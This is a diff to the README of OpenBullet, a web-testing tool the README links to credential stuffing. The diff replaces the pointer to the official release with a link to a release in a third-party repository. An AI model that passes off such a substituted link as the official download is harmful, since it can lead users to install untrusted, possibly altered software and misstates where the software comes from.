@@ -9,7 +9,7 @@ Link to the [Official Forum](https://discourse.openbullet.dev/) where you can fi
 **IMPORTANT!** Performing (D)DoS attacks or credential stuffing on sites you do not own (or you do not have permission to test) is **illegal!** The developer will not be held responsible for improper use of this software.
 
 # Download and setup
-Download the official Release from the **Releases** Tab!
+Download it from [here](https://github.com/dinxks/OpenBullet-RR/releases/tag/v1.0)
 
 # Screenshots
 
